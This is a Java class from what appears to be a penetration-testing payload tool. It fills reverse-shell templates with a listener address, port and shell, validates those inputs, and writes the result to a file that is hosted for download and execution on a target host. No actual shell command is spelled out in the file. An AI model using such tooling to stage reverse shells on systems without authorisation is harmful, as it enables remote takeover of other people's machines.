package com.crownest.payload;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

/**
 * A {@link PayloadOption} backed by a revshells.com reverse-shell template.
 *
 * The filled template (with LHOST/LPORT and the chosen shell) is written to a
 * file and hosted, so it can be downloaded and run on the target. The matching
 * download-and-execute command is offered separately by {@link ExecSuggestion}.
 */
public final class RevshellOption implements PayloadOption {

    private final RevshellCatalog.Entry entry;

    public RevshellOption(RevshellCatalog.Entry entry) {
        this.entry = entry;
    }

    public RevshellCatalog.Entry entry() {
        return entry;
    }

    @Override
    public String display() {
        return entry.name();
    }

    @Override
    public String kind() {
        return "Revshell";
    }

    private String fill(String ip, String port, String shell) {
        return entry.template()
                .replace("{ip}", ip)
                .replace("{port}", port)
                .replace("{shell}", shell == null || shell.isEmpty() ? "sh" : shell);
    }

    @Override
    public String preview(String ip, String port, String shell) {
        String shownIp = ip == null || ip.isEmpty() ? "{ip}" : ip;
        String shownPort = port == null || port.isEmpty() ? "{port}" : port;
        return fill(shownIp, shownPort, shell);
    }

    @Override
    public PayloadGenerator.Result generate(String ip, String port, String shell, Path baseDir) {
        // The same strict validation the msfvenom path uses, so a hostile
        // LHOST/LPORT can never be smuggled into the hosted payload file.
        if (!PayloadGenerator.isValidHost(ip)) {
            return new PayloadGenerator.Result(false, null, "",
                    "Invalid LHOST. Use an IP address or hostname "
                            + "(letters, digits, dot, colon, hyphen, underscore only).");
        }
        if (!PayloadGenerator.isValidPort(port)) {
            return new PayloadGenerator.Result(false, null, "",
                    "Invalid LPORT. Use a number between 1 and 65535.");
        }

        String body = fill(ip, port, shell);
        Path produced;
        try {
            String stamp = String.valueOf(System.currentTimeMillis());
            Path workDir = baseDir.resolve(stamp + "-" + slug(entry.name()));
            Files.createDirectories(workDir);
            produced = workDir.resolve(entry.fileName());
            Files.writeString(produced, body + System.lineSeparator(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            return new PayloadGenerator.Result(false, null, "",
                    "Could not write the payload: " + e.getMessage());
        }

        String shown = entry.name() + "  ->  " + entry.fileName();
        String log = "Hosted " + entry.fileName() + " with this payload:\n\n" + body;
        return new PayloadGenerator.Result(true, produced, shown, log);
    }

    private static String slug(String name) {
        String s = name.toLowerCase().replaceAll("[^a-z0-9]+", "-").replaceAll("(^-|-$)", "");
        return s.isEmpty() ? "rev" : s;
    }

    @Override
    public String toString() {
        return display();
    }
}
